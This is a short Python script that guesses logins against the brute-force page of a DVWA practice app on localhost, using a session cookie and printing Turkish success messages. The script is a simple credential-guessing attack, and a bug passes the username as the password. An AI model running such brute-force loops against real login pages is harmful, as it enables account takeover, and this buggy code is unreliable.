import requests
header={"Cookie":"security=impossible; PHPSESSID=jjbk76nopcvi02drleg9hghpi6"}
username_list=["admin","password"]
password_list=["admin","password"]

for i in username_list:
    for j in password_list:
        url="http://127.0.0.1/DVWA-master/vulnerabilities/brute/?username="+str(i)+"&password="+str(i)+"&Login=Login#"
        sonuc=requests.get(url=url,headers=header)
        print("username:",i)
        print("password:", j)
        print("status_code:", sonuc.status_code)
        print("Uzunluk",len(sonuc.content))
        if not "username and/or password incorrect" in str(sonuc.content):
            print("Kullanıcı adı ve parola doğru")
        print("-----------------")
